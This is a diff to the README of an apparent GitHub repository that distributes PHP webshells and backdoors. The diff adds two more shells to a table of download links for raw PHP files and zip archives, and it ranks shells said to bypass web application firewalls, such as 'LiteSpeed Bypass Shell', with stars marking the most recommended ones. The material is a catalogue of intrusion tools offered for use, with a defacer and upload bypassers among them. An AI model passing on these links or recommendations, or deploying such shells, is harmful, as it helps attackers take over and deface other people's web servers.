@@ -59,6 +59,7 @@
 | LOLZ Shell | [lolz.php](https://raw.githubusercontent.com/1337r0j4n/php-backdoors/main/SHELLs/LOLZ%20Shell/lolz.php) / [zip](https://github.com/1337r0j4n/php-backdoors/raw/main/SHELLs/LOLZ%20Shell/lolz.zip) | [screenshot](https://github.com/1337r0j4n/php-backdoors/tree/main/SHELLs/LOLZ%20Shell) |
 | LiteSpeed Bypass Shell | [litespeed.php](https://raw.githubusercontent.com/1337r0j4n/php-backdoors/main/SHELLs/LiteSpeed%20Bypass%20Shell/LiteSpeed.php) / [zip](https://github.com/1337r0j4n/php-backdoors/raw/main/SHELLs/LiteSpeed%20Bypass%20Shell/LiteSpeed.zip) | [screenshot](https://github.com/1337r0j4n/php-backdoors/tree/main/SHELLs/LiteSpeed%20Bypass%20Shell) |
 | M1N1 Upl04d3r | [uploader.php](https://raw.githubusercontent.com/1337r0j4n/webshells/main/SHELLs/M1N1%20Upl04d3r/uploader.php) / [zip](https://github.com/1337r0j4n/php-backdoors/raw/main/SHELLs/M1N1%20Upl04d3r/uploader.zip) | [screenshot](https://github.com/1337r0j4n/webshells/tree/main/SHELLs/M1N1%20Upl04d3r) |
+| Mad Tools Shell| [mad.php](https://raw.githubusercontent.com/1337r0j4n/php-backdoors/main/SHELLs/Mad%20Tools%20Shell/mad.php) / [zip](https://github.com/1337r0j4n/php-backdoors/raw/main/SHELLs/Mad%20Tools%20Shell/mad.zip) | [screenshot](https://github.com/1337r0j4n/php-backdoors/tree/main/SHELLs/Mad%20Tools%20Shell) |
 | Magic Byte Bypass Uploader | [bpmagicbyte.php](https://github.com/1337r0j4n/php-backdoors/raw/main/SHELLs/Magic%20Byte%20Bypass%20Uploader/bpmaigcbyte.php) / [zip](https://github.com/1337r0j4n/php-backdoors/raw/main/SHELLs/Magic%20Byte%20Bypass%20Uploader/bpmaigcbyte.zip) | [screenshot](https://github.com/1337r0j4n/php-backdoors/tree/main/SHELLs/Magic%20Byte%20Bypass%20Uploader) |
 | Marijuana Shell | [marijuana.php](https://raw.githubusercontent.com/1337r0j4n/webshells/main/SHELLs/Marijuana%20Shell/marijuana.php) / [zip](https://github.com/1337r0j4n/php-backdoors/raw/main/SHELLs/Marijuana%20Shell/marijuana.zip) | [screenshot](https://github.com/1337r0j4n/webshells/tree/main/SHELLs/Marijuana%20Shell) |
 | Mass Defacer | [mass.php](https://raw.githubusercontent.com/1337r0j4n/webshells/main/SHELLs/Mass%20Defacer/mass.php) / [zip](https://github.com/1337r0j4n/php-backdoors/raw/main/SHELLs/Mass%20Defacer/mass.zip) | [screenshot](https://github.com/1337r0j4n/webshells/tree/main/SHELLs/Mass%20Defacer) |
@@ -66,6 +67,7 @@
 | Minions Cyber Crime Shell | [mcc.php](https://raw.githubusercontent.com/1337r0j4n/webshells/main/SHELLs/Minions%20Cyber%20Crime%20Shell/mcc.php) / [zip](https://github.com/1337r0j4n/php-backdoors/raw/main/SHELLs/Minions%20Cyber%20Crime%20Shell/mcc.zip) & [mini.php](https://raw.githubusercontent.com/1337r0j4n/webshells/main/SHELLs/Minions%20Cyber%20Crime%20Shell/mini.php) / [zip](https://github.com/1337r0j4n/php-backdoors/raw/main/SHELLs/Minions%20Cyber%20Crime%20Shell/mcc.zip) | [screenshot](https://github.com/1337r0j4n/webshells/tree/main/SHELLs/Minions%20Cyber%20Crime%20Shell) |
 | Ninja Shell | [ninja.php](https://raw.githubusercontent.com/1337r0j4n/php-backdoors/main/SHELLs/Ninja%20Shell/ninja.php) / [zip](https://github.com/1337r0j4n/php-backdoors/raw/main/SHELLs/Ninja%20Shell/ninja.zip) | [screenshot](https://github.com/1337r0j4n/php-backdoors/tree/main/SHELLs/Ninja%20Shell) |
 | NuLz404 Shell | [nulz.php](https://raw.githubusercontent.com/1337r0j4n/php-backdoors/main/SHELLs/NuLz404%20Shell/nulz.php) / [zip](https://github.com/1337r0j4n/php-backdoors/raw/main/SHELLs/NuLz404%20Shell/nulz.zip) | [screenshot](https://github.com/1337r0j4n/php-backdoors/tree/main/SHELLs/NuLz404%20Shell) |
+| One liner Mini Shell | [oneliner-mini.php](https://raw.githubusercontent.com/1337r0j4n/php-backdoors/main/SHELLs/One%20Liner%20Mini%20Shell/onliner-mini.php) / [zip](https://github.com/1337r0j4n/php-backdoors/raw/main/SHELLs/One%20Liner%20Mini%20Shell/onliner-mini.zip) | [screenshot](https://github.com/1337r0j4n/php-backdoors/tree/main/SHELLs/One%20Liner%20Mini%20Shell) |
 | Ophellia Webshell | [ophellia.php](https://raw.githubusercontent.com/1337r0j4n/php-backdoors/main/SHELLs/Ophellia%20Webshell/ophellia.php) / [zip](https://github.com/1337r0j4n/php-backdoors/raw/main/SHELLs/Ophellia%20Webshell/ophellia.zip) | [screenshot](https://github.com/1337r0j4n/php-backdoors/tree/main/SHELLs/Ophellia%20Webshell) |
 | P0wny Shell | [p0wny.php](https://raw.githubusercontent.com/1337r0j4n/webshells/main/SHELLs/P0wny%20Shell/p0wny.php) / [zip](https://github.com/1337r0j4n/php-backdoors/raw/main/SHELLs/P0wny%20Shell/p0wny.zip) | [screenshot](https://github.com/1337r0j4n/webshells/tree/main/SHELLs/P0wny%20Shell) |
 | Pr1v5H3!! Shell | [privshell.php](https://raw.githubusercontent.com/1337r0j4n/php-backdoors/main/SHELLs/Pr1v5H3!!/privshell.php) / [zip](https://github.com/1337r0j4n/php-backdoors/raw/main/SHELLs/Pr1v5H3!!/privshell.zip) | [screenshot](https://github.com/1337r0j4n/php-backdoors/tree/main/SHELLs/Pr1v5H3!!) |
@@ -116,19 +118,24 @@
   - all tested
   - perfectly work
 
- ### the shells that can bypass LiteSpeed and other WAF 
+----
+
+ ### the shells that can bypass WAF
 
 ```
 - Anti Shell
 - APT Probe Shell
-- Dadsec WSO Shell
-- Elep FileManager
-- Gecko Shell
-- LiteSpeed Bypass Shell 
-- Pr1v5H3!! Shell
-- ZERO Shell
-- zerobyte Shell
+- Dadsec WSO Shell **
+- Elep FileManager ****
+- Gecko Shell *
+- Ultra Shell *
+- LiteSpeed Bypass Shell *****
+- Pr1v5H3!! Shell ****
+- ZERO Shell *
+- zerobyte Shell **
 ```
+> \* mean the most recommend shell that i request :D
+
 ---
 
 > **if this repositories was really helpful for you, then click star, fork button and share to yours friends.**
